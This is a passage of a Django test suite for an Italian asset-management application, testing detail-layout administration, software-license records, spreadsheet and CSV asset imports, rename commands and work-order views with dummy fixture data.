            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_THIRD,
            sort_order=10,
            is_active=True,
        )
        field_b = AssetDetailField.objects.create(
            code="bulk-size-field-b",
            label="Modello",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:model",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_HALF,
            sort_order=20,
            is_active=True,
        )
        self.client.force_login(admin)

        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "update_detail_field_bulk",
                "bulk_field": "card_size",
                "bulk_card_size": AssetDetailField.CARD_FULL,
                "apply_scope": "all",
            },
        )

        self.assertEqual(response.status_code, 302)
        self.assertEqual(
            set(
                AssetDetailField.objects.filter(pk__in=[field_a.id, field_b.id]).values_list("card_size", flat=True)
            ),
            {AssetDetailField.CARD_FULL},
        )

    def test_asset_detail_layout_admin_can_apply_bulk_active_state_to_selected_detail_fields(self):
        admin = User.objects.create_superuser(
            username="asset-layout-detail-bulk-active-admin",
            email="asset-layout-detail-bulk-active@test.local",
            password="pass12345",
        )
        field_a = AssetDetailField.objects.create(
            code="bulk-active-field-a",
            label="Produttore",
            section=AssetDetailField.SECTION_SPECS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:manufacturer",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_THIRD,
            sort_order=10,
            is_active=True,
        )
        field_b = AssetDetailField.objects.create(
            code="bulk-active-field-b",
            label="Modello",
            section=AssetDetailField.SECTION_METRICS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:model",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_HALF,
            sort_order=20,
            is_active=True,
        )
        field_c = AssetDetailField.objects.create(
            code="bulk-active-field-c",
            label="Reparto",
            section=AssetDetailField.SECTION_PROFILE,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="asset:reparto",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_HALF,
            sort_order=30,
            is_active=True,
        )
        selected_ids = [field_a.id, field_b.id]
        self.client.force_login(admin)

        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "update_detail_field_bulk",
                "bulk_field": "is_active",
                "bulk_is_active": "inactive",
                "apply_scope": "selected",
                "selected_detail_field_ids": [str(row_id) for row_id in selected_ids],
            },
        )

        self.assertEqual(response.status_code, 302)
        inactive_ids = set(
            AssetDetailField.objects.filter(pk__in=[field_a.id, field_b.id, field_c.id], is_active=False).values_list(
                "id", flat=True
            )
        )
        self.assertEqual(inactive_ids, set(selected_ids))
        self.assertTrue(AssetDetailField.objects.get(pk=field_c.id).is_active)

    def test_asset_detail_shows_layout_button_for_layout_manager(self):
        asset = Asset.objects.create(
            asset_tag="AST-LAYOUT-001",
            name="Asset layout",
            asset_type=Asset.TYPE_OTHER,
        )
        self.client.force_login(self.user)

        with patch("assets.views.user_can_modulo_action", return_value=True):
            response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Configura layout")

    def test_asset_detail_uses_layout_visibility_and_metric_sizes(self):
        admin = User.objects.create_superuser(
            username="asset-layout-render-admin",
            email="asset-layout-render@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            asset_tag="AST-LAYOUT-002",
            name="Asset render layout",
            asset_type=Asset.TYPE_OTHER,
            extra_columns={"uptime": "99.8%"},
        )
        AssetCustomField.objects.create(
            code="uptime",
            label="Uptime",
            field_type=AssetCustomField.TYPE_TEXT,
            is_active=True,
        )
        AssetDetailField.objects.create(
            code="metric-uptime",
            label="Uptime",
            section=AssetDetailField.SECTION_METRICS,
            asset_scope=AssetDetailField.SCOPE_ALL,
            source_ref="custom:uptime",
            value_format=AssetDetailField.FORMAT_TEXT,
            card_size=AssetDetailField.CARD_FULL,
            sort_order=10,
            is_active=True,
        )
        AssetDetailSectionLayout.objects.update_or_create(
            code=AssetDetailSectionLayout.SECTION_QR,
            defaults={
                "grid_size": AssetDetailSectionLayout.SIZE_HALF,
                "sort_order": 240,
                "is_visible": False,
            },
        )

        self.client.force_login(admin)
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'af-metric af-span-full', html=False)
        self.assertContains(response, "Uptime")
        self.assertNotContains(response, "QR asset")

    def test_layout_admin_can_hide_category_field_from_asset_detail(self):
        admin = User.objects.create_superuser(
            username="asset-layout-category-admin",
            email="asset-layout-category@test.local",
            password="pass12345",
        )
        category = AssetCategory.objects.create(
            code="caldaia",
            label="Caldaia",
            base_asset_type=Asset.TYPE_OTHER,
            is_active=True,
        )
        category_field = AssetCategoryField.objects.create(
            category=category,
            code="potenza_termica",
            label="Potenza termica",
            field_type=AssetCategoryField.TYPE_TEXT,
            detail_section=AssetDetailField.SECTION_SPECS,
            detail_value_format=AssetDetailField.FORMAT_TEXT,
            detail_card_size=AssetDetailField.CARD_HALF,
            show_in_form=True,
            show_in_detail=True,
            is_active=True,
        )
        asset = Asset.objects.create(
            asset_tag="AST-CAT-LAYOUT-001",
            name="Caldaia test",
            asset_type=Asset.TYPE_OTHER,
            asset_category=category,
            extra_columns={"_category_fields": {"potenza_termica": "120 kW"}},
        )

        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:asset_detail_layout_admin"),
            {
                "action": "update_asset_category_field",
                "category_field_id": str(category_field.id),
                "category_id": str(category.id),
                "label": category_field.label,
                "field_type": category_field.field_type,
                "detail_section": category_field.detail_section,
                "detail_value_format": category_field.detail_value_format,
                "detail_card_size": category_field.detail_card_size,
                "placeholder": category_field.placeholder,
                "help_text": category_field.help_text,
                "sort_order": str(category_field.sort_order),
                "show_in_form": "1",
                "is_active": "1",
            },
        )

        self.assertEqual(response.status_code, 302)
        category_field.refresh_from_db()
        self.assertFalse(category_field.show_in_detail)

        self.client.get(reverse("assets:asset_detail_layout_admin"))
        response = self.client.get(reverse("assets:asset_view", args=[asset.id]))
        self.assertEqual(response.status_code, 200)
        self.assertNotContains(response, "Potenza termica")


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class SoftwareLicenseTests(TestCase):
    def setUp(self):
        self.admin = User.objects.create_superuser(
            username="asset-license-admin",
            email="asset-license-admin@test.local",
            password="pass12345",
        )
        self.category = AssetCategory.objects.create(
            code="license-category",
            label="Categoria Licenze",
            base_asset_type=Asset.TYPE_PC,
            sort_order=10,
        )
        self.asset = Asset.objects.create(
            name="PC Licenze",
            asset_type=Asset.TYPE_PC,
            asset_category=self.category,
            reparto="IT",
            source_key="asset-license-main",
        )

    def test_software_license_list_renders(self):
        self.client.force_login(self.admin)
        response = self.client.get(reverse("assets:software_license_list"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Licenze software")

    def test_software_license_list_creates_for_asset(self):
        self.client.force_login(self.admin)
        response = self.client.post(
            reverse("assets:software_license_list") + f"?asset={self.asset.id}",
            {
                "asset_id": str(self.asset.id),
                "action": "create_software_license",
                "category": SoftwareLicense.CATEGORY_SOFTWARE,
                "vendor": "Microsoft",
                "product_name": "Office 365",
                "edition": "Business Standard",
                "license_reference": "MS-001",
                "account_email": "it@example.local",
                "seats_total": "10",
                "seats_used": "5",
                "purchase_date": "2026-01-01",
                "renewal_date": "2026-12-01",
                "expiry_date": "2026-12-31",
                "auto_renew": "on",
                "is_active": "on",
                "notes": "Licenza asset",
                "assigned_employee_id": "",
            },
        )

        self.assertEqual(response.status_code, 302)
        license_row = SoftwareLicense.objects.get(license_reference="MS-001")
        self.assertEqual(license_row.asset, self.asset)

    def test_software_license_list_creates_for_employee(self):
        _ensure_anagrafica_table()
        with connection.cursor() as cursor:
            cursor.execute(
                """
                INSERT INTO anagrafica_dipendenti
                    (aliasusername, nome, cognome, reparto, email, attivo)
                VALUES
                    (%s, %s, %s, %s, %s, %s)
                """,
                ["a.rossi", "Alessia", "Rossi", "IT", "a.rossi@example.local", 1],
            )
            cursor.execute(
                """
                SELECT id
                FROM anagrafica_dipendenti
                WHERE aliasusername = %s
                """,
                ["a.rossi"],
            )
            row = cursor.fetchone()

        self.client.force_login(self.admin)
        response = self.client.post(
            reverse("assets:software_license_list") + f"?anagrafica={int(row[0])}",
            {
                "anagrafica_id": str(int(row[0])),
                "action": "create_software_license",
                "category": SoftwareLicense.CATEGORY_ANTIVIRUS,
                "vendor": "Eset",
                "product_name": "Endpoint Security",
                "edition": "",
                "license_reference": "AV-200",
                "account_email": "security@example.local",
                "seats_total": "1",
                "seats_used": "1",
                "purchase_date": "",
                "renewal_date": "",
                "expiry_date": "",
                "auto_renew": "",
                "is_active": "on",
                "notes": "",
                "assigned_employee_id": str(int(row[0])),
            },
        )

        self.assertEqual(response.status_code, 302)
        license_row = SoftwareLicense.objects.get(license_reference="AV-200")
        self.assertEqual(license_row.assigned_anagrafica_id, int(row[0]))
        self.assertIn("Rossi", license_row.assigned_to_display)

    def test_asset_detail_shows_software_license(self):
        SoftwareLicense.objects.create(
            category=SoftwareLicense.CATEGORY_OFFICE,
            vendor="Microsoft",
            product_name="Office 365",
            asset=self.asset,
        )
        self.client.force_login(self.admin)

        response = self.client.get(reverse("assets:asset_view", kwargs={"id": self.asset.id}))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Office 365")


class SeedAssetsACLTests(TestCase):
    def setUp(self):
        _ensure_legacy_pulsanti_table()

    def test_seed_acl_is_idempotent(self):
        call_command("seed_assets_acl")
        first_count = Pulsante.objects.filter(modulo="assets").count()
        self.assertGreaterEqual(first_count, 10)
        self.assertTrue(Pulsante.objects.filter(modulo="assets", codice="asset_detail_layout").exists())

        call_command("seed_assets_acl")
        second_count = Pulsante.objects.filter(modulo="assets").count()
        self.assertEqual(first_count, second_count)


class ImportAssetsExcelTests(TestCase):
    def test_dry_run_does_not_write(self):
        with _workspace_temporary_directory("assets-import-") as tmpdir:
            file_path = Path(tmpdir) / "assets.xlsx"
            _build_workbook(file_path)
            before_assets = Asset.objects.count()
            call_command(
                "import_assets_excel",
                file=str(file_path),
                sheets="LAN A 203.0.113.x",
                dry_run=True,
            )
            self.assertEqual(Asset.objects.count(), before_assets)

    def test_import_creates_asset_endpoint_and_details(self):
        with _workspace_temporary_directory("assets-import-") as tmpdir:
            file_path = Path(tmpdir) / "assets.xlsx"
            _build_workbook(file_path)
            call_command(
                "import_assets_excel",
                file=str(file_path),
                sheets="LAN A 203.0.113.x",
            )
            self.assertEqual(Asset.objects.count(), 1)
            asset = Asset.objects.first()
            self.assertIsNotNone(asset)
            self.assertEqual(asset.name, "PC-UFFICIO-01")
            self.assertEqual(asset.asset_type, Asset.TYPE_PC)

            self.assertEqual(AssetEndpoint.objects.filter(asset=asset).count(), 1)
            endpoint = AssetEndpoint.objects.get(asset=asset)
            self.assertEqual(endpoint.vlan, 23)
            self.assertEqual(endpoint.ip, "198.51.100.23")

            self.assertTrue(AssetITDetails.objects.filter(asset=asset).exists())
            details = AssetITDetails.objects.get(asset=asset)
            self.assertTrue(details.domain_joined)
            self.assertTrue(details.edr_enabled)
            self.assertTrue(details.office_2fa_enabled)
            self.assertTrue(details.bios_pwd_set)

    def test_import_creates_custom_fields_for_unknown_columns(self):
        with _workspace_temporary_directory("assets-import-extra-") as tmpdir:
            file_path = Path(tmpdir) / "assets-extra.xlsx"
            _build_workbook_custom(
                file_path,
                sheet_name="Macchine Officina",
                headers=["REPARTO", "NOME", "TIPO", "ID", "CENTRO COSTO", "CODICE INTERNO"],
                rows=[["CQF", "TORNIO-01", "CNC", "MAC-900", "OFFICINA-A", "INT-001"]],
                header_row=5,
            )
            call_command(
                "import_assets_excel",
                file=str(file_path),
                sheets="Macchine Officina",
            )
            asset = Asset.objects.get()
            self.assertEqual(asset.name, "TORNIO-01")
            self.assertEqual(asset.asset_type, Asset.TYPE_CNC)
            centro_field = AssetCustomField.objects.get(label="CENTRO COSTO")
            codice_field = AssetCustomField.objects.get(label="CODICE INTERNO")
            self.assertEqual(asset.extra_columns.get(centro_field.code), "OFFICINA-A")
            self.assertEqual(asset.extra_columns.get(codice_field.code), "INT-001")

    def test_import_sensitive_columns_store_presence_only(self):
        with _workspace_temporary_directory("assets-import-sensitive-") as tmpdir:
            file_path = Path(tmpdir) / "assets-sensitive.xlsx"
            _build_workbook_custom(
                file_path,
                sheet_name="Telefonia",
                headers=["NOME", "TIPO", "ID", "PIN SIM"],
                rows=[["SIM-DATA-01", "SIM", "ICCID-9988", "1234"]],
                header_row=5,
            )
            call_command(
                "import_assets_excel",
                file=str(file_path),
                sheets="Telefonia",
            )
            asset = Asset.objects.get()
            pin_field = AssetCustomField.objects.get(label="PIN SIM (presente)")
            self.assertEqual(pin_field.field_type, AssetCustomField.TYPE_BOOL)
            self.assertIs(asset.extra_columns.get(pin_field.code), True)
            self.assertNotIn("1234", [str(v) for v in asset.extra_columns.values()])

    def test_import_fuzzy_sheet_name_matching(self):
        with _workspace_temporary_directory("assets-import-fuzzy-") as tmpdir:
            file_path = Path(tmpdir) / "assets-sim.xlsx"
            _build_workbook_custom(
                file_path,
                sheet_name="sim telefonica",
                headers=["NOME", "TIPO", "ID"],
                rows=[["SIM-VOICE-01", "SIM", "ICCID-0001"]],
                header_row=1,
            )
            call_command(
                "import_assets_excel",
                file=str(file_path),
                sheets="SIM Telefonica",
            )
            asset = Asset.objects.get()
            self.assertEqual(asset.name, "SIM-VOICE-01")
            self.assertEqual(asset.serial_number, "ICCID-0001")


class ImportAssetsCatalogTests(TestCase):
    def _write_catalog_csv(self, path: Path, rows: list[list[str]]) -> None:
        lines = ["asset_id;famiglia;sottocategoria;descrizione;nome;ubicazione;matricola;stato"]
        lines.extend(";".join(row) for row in rows)
        path.write_text("\n".join(lines), encoding="utf-8")

    def test_creates_parent_category_from_famiglia(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "", "Reparto A", "M-2286", "In uso"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertTrue(AssetCategory.objects.filter(label="Sollevamento", parent__isnull=True).exists())

    def test_creates_subcategory_under_parent(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "", "Reparto A", "M-2286", "In uso"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            parent = AssetCategory.objects.get(label="Sollevamento", parent__isnull=True)
            subcategory = AssetCategory.objects.get(label="Carroponte", parent=parent)
            self.assertEqual(subcategory.base_asset_type, Asset.TYPE_CARROPONTE)

    def test_creates_asset_with_explicit_asset_id(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "CP 142", "Reparto A", "M-2286", "In uso"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            asset = Asset.objects.get(asset_tag="APLCP142-MATR.PI-I-2286")
            self.assertEqual(asset.name, "CP 142")
            self.assertEqual(asset.serial_number, "M-2286")
            self.assertEqual(asset.asset_category.label, "Carroponte")

    def test_double_import_is_idempotent(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "CP 142", "Reparto A", "M-2286", "In uso"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)
            call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertEqual(Asset.objects.filter(asset_tag="APLCP142-MATR.PI-I-2286").count(), 1)
            self.assertEqual(AssetCategory.objects.filter(label="Sollevamento", parent__isnull=True).count(), 1)
            self.assertEqual(AssetCategory.objects.filter(label="Carroponte").count(), 1)

    def test_dry_run_does_not_write(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "CP 142", "Reparto A", "M-2286", "In uso"]],
            )

            call_command("import_assets_catalog", str(file_path), dry_run=True)

            self.assertEqual(Asset.objects.count(), 0)
            # Il conteggio globale non e' 0: la data-migration 0073 semina una categoria.
            # Verifichiamo che il dry-run non abbia creato QUELLE del CSV.
            self.assertEqual(
                AssetCategory.objects.filter(label__in=["Sollevamento", "Carroponte"]).count(),
                0,
            )

    def test_missing_famiglia_is_blocking_error(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "", "Carroponte", "Linea A", "CP 142", "Reparto A", "M-2286", "In uso"]],
            )

            with self.assertRaisesMessage(CommandError, "Import annullato"):
                call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertEqual(Asset.objects.count(), 0)

    def test_missing_sottocategoria_is_blocking_error(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "", "Linea A", "CP 142", "Reparto A", "M-2286", "In uso"]],
            )

            with self.assertRaisesMessage(CommandError, "Import annullato"):
                call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertEqual(Asset.objects.count(), 0)

    def test_updates_existing_asset_without_duplicate(self):
        Asset.objects.create(asset_tag="APLCP142-MATR.PI-I-2286", name="Vecchio nome", asset_type=Asset.TYPE_OTHER)
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["APLCP142-MATR.PI-I-2286", "Sollevamento", "Carroponte", "Linea A", "CP aggiornato", "Reparto B", "M-2286", "In riparazione"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertEqual(Asset.objects.filter(asset_tag="APLCP142-MATR.PI-I-2286").count(), 1)
            asset = Asset.objects.get(asset_tag="APLCP142-MATR.PI-I-2286")
            self.assertEqual(asset.name, "CP aggiornato")
            self.assertEqual(asset.reparto, "Reparto B")
            self.assertEqual(asset.status, Asset.STATUS_IN_REPAIR)

    def test_generic_cn_asset_is_imported_as_real_asset(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.csv"
            self._write_catalog_csv(
                file_path,
                [["CN-ANT", "Generici CN", "Asset generico", "Antincendio generale", "", "Stabilimento", "", "Attivo"]],
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            asset = Asset.objects.get(asset_tag="CN-ANT")
            self.assertEqual(asset.notes, "Asset generico CN")
            self.assertIs(asset.extra_columns.get("is_generic_asset"), True)

    def _write_catalog_xlsx_multisheet(self, path: Path, sheets: dict[str, list[list[object]]]) -> None:
        headers = ["asset_id", "famiglia", "sottocategoria", "descrizione", "nome", "ubicazione", "matricola", "stato"]
        wb = Workbook()
        wb.remove(wb.active)
        for sheet_name, rows in sheets.items():
            ws = wb.create_sheet(title=sheet_name)
            for col_idx, header in enumerate(headers, start=1):
                ws.cell(row=1, column=col_idx, value=header)
            for row_offset, row_values in enumerate(rows, start=2):
                for col_idx, value in enumerate(row_values, start=1):
                    ws.cell(row=row_offset, column=col_idx, value=value)
        wb.save(path)

    def test_xlsx_import_processes_all_sheets(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.xlsx"
            self._write_catalog_xlsx_multisheet(
                file_path,
                {
                    "IT": [["IT-AP-001", "Information Technology", "Access Point", "AP UT", "AP UT", "AMM", "MAC-1", "In uso"]],
                    "Macchine": [["CNC-DM-001", "CMM", "Macchine CNC", "DMG DMC 85", "DMC 85", "CN5", "SN-85", "In uso"]],
                },
            )

            call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertTrue(Asset.objects.filter(asset_tag="IT-AP-001").exists())
            self.assertTrue(Asset.objects.filter(asset_tag="CNC-DM-001").exists())

    def test_xlsx_import_error_message_includes_sheet_name(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.xlsx"
            self._write_catalog_xlsx_multisheet(
                file_path,
                {
                    "IT": [["IT-AP-001", "Information Technology", "Access Point", "AP UT", "AP UT", "AMM", "MAC-1", "In uso"]],
                    "Macchine": [["CNC-DM-001", "", "Macchine CNC", "DMG DMC 85", "DMC 85", "CN5", "SN-85", "In uso"]],
                },
            )

            with self.assertRaisesMessage(CommandError, "Import annullato"):
                call_command("import_assets_catalog", str(file_path), commit=True)

            self.assertEqual(Asset.objects.count(), 0)
            preview = AssetCatalogImporter().preview(file_path)
            self.assertTrue(any("foglio 'Macchine'" in err.row_number for err in preview.errors))

    def test_xlsx_import_maps_manufacturer_model_and_extra_columns(self):
        with _workspace_temporary_directory("assets-catalog-") as tmpdir:
            file_path = Path(tmpdir) / "catalogo.xlsx"
            wb = Workbook()
            ws = wb.active
            ws.title = "IT"
            headers = [
                "asset_id", "famiglia", "sottocategoria", "nome", "ubicazione",
                "matricola", "stato", "produttore", "modello", "indirizzo_ip", "porta sw",
            ]
            values = [
                "IT-AP-001", "Information Technology", "Access Point", "AP UT", "AMM",
                "MAC-1", "In uso", "Unifi", "UAP-LR", "10.0.0.204", "A0.1.06",
            ]
            for col_idx, header in enumerate(headers, start=1):
                ws.cell(row=1, column=col_idx, value=header)
            for col_idx, value in enumerate(values, start=1):
                ws.cell(row=2, column=col_idx, value=value)
            wb.save(file_path)

            call_command("import_assets_catalog", str(file_path), commit=True)

            asset = Asset.objects.get(asset_tag="IT-AP-001")
            self.assertEqual(asset.manufacturer, "Unifi")
            self.assertEqual(asset.model, "UAP-LR")
            self.assertEqual(asset.extra_columns.get("indirizzo_ip"), "10.0.0.204")
            self.assertEqual(asset.extra_columns.get("porta sw"), "A0.1.06")


class RenameAssetNamesCommandTests(TestCase):
    def setUp(self):
        self.asset = Asset.objects.create(
            asset_tag="ML-000001",
            name="Macchine CNC | DMG Mori DMC 160U",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
        )

    def _write_rename_csv(self, path: Path, rows: list[list[str]]) -> None:
        lines = ["asset_tag;new_name"]
        lines.extend(";".join(row) for row in rows)
        path.write_text("\n".join(lines), encoding="utf-8")

    def test_dry_run_does_not_update_asset_name(self):
        with _workspace_temporary_directory("assets-rename-") as tmpdir:
            file_path = Path(tmpdir) / "rename.csv"
            self._write_rename_csv(file_path, [["ML-000001", "DMG Mori DMC 160U"]])

            call_command("rename_asset_names", str(file_path), stdout=io.StringIO())

            self.asset.refresh_from_db()
            self.assertEqual(self.asset.name, "Macchine CNC | DMG Mori DMC 160U")

    def test_commit_updates_only_asset_name(self):
        with _workspace_temporary_directory("assets-rename-") as tmpdir:
            file_path = Path(tmpdir) / "rename.csv"
            self._write_rename_csv(file_path, [["ML-000001", "DMG Mori DMC 160U"]])

            call_command("rename_asset_names", str(file_path), commit=True, stdout=io.StringIO())

            self.asset.refresh_from_db()
            self.assertEqual(self.asset.name, "DMG Mori DMC 160U")
            self.assertEqual(self.asset.asset_tag, "ML-000001")
            self.assertEqual(self.asset.asset_type, Asset.TYPE_WORK_MACHINE)
            self.assertEqual(self.asset.reparto, "CN5")

    def test_export_template_contains_current_name_as_editable_new_name(self):
        with _workspace_temporary_directory("assets-rename-template-") as tmpdir:
            file_path = Path(tmpdir) / "template.csv"

            call_command("rename_asset_names", export_template=str(file_path), stdout=io.StringIO())

            text = file_path.read_text(encoding="utf-8-sig")
            self.assertIn("asset_tag;current_name;new_name", text)
            self.assertIn("ML-000001;Macchine CNC | DMG Mori DMC 160U;Macchine CNC | DMG Mori DMC 160U", text)

    def test_missing_asset_blocks_commit_without_partial_updates(self):
        with _workspace_temporary_directory("assets-rename-error-") as tmpdir:
            file_path = Path(tmpdir) / "rename.csv"
            self._write_rename_csv(
                file_path,
                [
                    ["ML-000001", "DMG Mori DMC 160U"],
                    ["ML-404", "Asset inesistente"],
                ],
            )

            with self.assertRaisesMessage(CommandError, "Rinomina annullata"):
                call_command("rename_asset_names", str(file_path), commit=True, stdout=io.StringIO())

            self.asset.refresh_from_db()
            self.assertEqual(self.asset.name, "Macchine CNC | DMG Mori DMC 160U")


class ImportWorkMachinesExcelTests(TestCase):
    def test_import_creates_assets_and_work_machines(self):
        with _workspace_temporary_directory("assets-work-machines-import-") as tmpdir:
            file_path = Path(tmpdir) / "macchine.xlsx"
            _build_work_machine_workbook(
                file_path,
                rows=[
                    ["CN5", "DMG Mori DMC 160U", 1600, 1600, 1100, "-", "-", 2019, 183, "âœ“", "-", "âœ“", "-", "-"],
                    ["CN5", "DMG Mori DMC 160U", 1600, 1600, 1100, "-", "-", 2023, 243, "âœ“", "-", "âœ“", "âœ“", "0.010"],
                ],
            )

            call_command("import_work_machines_excel", file=str(file_path))

            self.assertEqual(Asset.objects.filter(asset_type=Asset.TYPE_WORK_MACHINE).count(), 2)
            self.assertEqual(WorkMachine.objects.count(), 2)

            newer_asset = Asset.objects.get(source_key=WorkMachine.objects.get(year=2023).source_key)
            self.assertEqual(newer_asset.reparto, "CN5")
            self.assertEqual(newer_asset.manufacturer, "DMG Mori")
            self.assertEqual(newer_asset.model, "DMC 160U")

            newer_machine = WorkMachine.objects.get(asset=newer_asset)
            self.assertEqual(newer_machine.tmc, 243)
            self.assertTrue(newer_machine.tcr_enabled)
            self.assertTrue(newer_machine.cnc_controlled)
            self.assertTrue(newer_machine.five_axes)
            self.assertEqual(str(newer_machine.pressure_bar or ""), "")
            self.assertEqual(newer_machine.accuracy_from, "0.010")

    def test_import_updates_existing_machine_without_duplicate_assets(self):
        with _workspace_temporary_directory("assets-work-machines-import-") as tmpdir:
            file_path = Path(tmpdir) / "macchine.xlsx"
            _build_work_machine_workbook(
                file_path,
                rows=[
                    ["TNC", "DMG Ecturn 650", "-", "-", "-", "-", "-", 2019, "-", "âœ“", 6, "âœ“", "-", "-"],
                ],
            )
            call_command("import_work_machines_excel", file=str(file_path))

            _build_work_machine_workbook(
                file_path,
                rows=[
                    ["TNC", "DMG Ecturn 650", "-", "-", "-", "-", "-", 2019, 12, "-", 8, "âœ“", "âœ“", "0.005"],
                ],
            )
            call_command("import_work_machines_excel", file=str(file_path))

            self.assertEqual(Asset.objects.filter(asset_type=Asset.TYPE_WORK_MACHINE).count(), 1)
            machine = WorkMachine.objects.get()
            self.assertEqual(machine.tmc, 12)
            self.assertFalse(machine.tcr_enabled)
            self.assertEqual(str(machine.pressure_bar), "8.00")
            self.assertTrue(machine.five_axes)
            self.assertEqual(machine.accuracy_from, "0.005")


class WorkOrderFlowTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_superuser(
            username="wo.user",
            email="wo.user@example.com",
            password="secret123",
        )
        self.asset = Asset.objects.create(
            asset_tag="IT-000124",
            name="Server test",
            asset_type=Asset.TYPE_SERVER,
            status=Asset.STATUS_IN_USE,
        )

    def test_workorder_list_exposes_new_intervention_selector(self):
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:wo_list"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "+ Nuovo intervento")
        self.assertContains(response, 'name="asset"')
        self.assertContains(response, 'class="wo-create-dialog"', html=False)
        self.assertContains(response, "data-wo-create-search", html=False)
        self.assertContains(response, "data-wo-asset-option", html=False)
        self.assertContains(response, self.asset.asset_tag)

    def test_global_workorder_create_redirects_to_selected_asset_form(self):
        self.client.force_login(self.user)

        response = self.client.get(
            reverse("assets:wo_create"),
            {"asset": str(self.asset.id), "kind": WorkOrder.KIND_CORRECTIVE},
        )

        expected_url = (
            f"{reverse('assets:wo_create', args=[self.asset.id])}"
            f"?kind={WorkOrder.KIND_CORRECTIVE}&source=workorder_list"
        )
        self.assertRedirects(response, expected_url, fetch_redirect_response=False)

    def test_global_workorder_create_without_asset_opens_asset_selector(self):
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:wo_create"))

        self.assertRedirects(
            response,
            f'{reverse("assets:wo_list")}?create=1',
            fetch_redirect_response=False,
        )

    def test_workorder_list_defaults_to_open_operational_queue(self):
        open_workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_CORRECTIVE,
            status=WorkOrder.STATUS_OPEN,
            title="Guasto da prendere in carico",
        )
        closed_workorder = WorkOrder.objects.create(
            asset=self.asset,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_DONE,
            title="Intervento gia chiuso",
            closed_at=timezone.now(),
        )
        self.client.force_login(self.user)

        response = self.client.get(reverse("assets:wo_list"))

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["workorder_view"], "open")
        self.assertContains(response, "Interventi aperti")
        self.assertContains(response, "Assegnati a me")
        self.assertContains(response, "Non assegnati")
        self.assertContains(response, "Altri filtri")
        self.assertContains(response, open_workorder.title)
        self.assertNotContains(response, closed_workorder.title)
        self.assertContains(response, "Prendi in carico")
        self.assertContains(response, reverse("assets:wo_claim", args=[open_workorder.id]))
        self.assertNotContains(response, "<th>Copertura</th>", html=False)
        self.assertNotContains(response, "<th>Costi</th>", html=False)

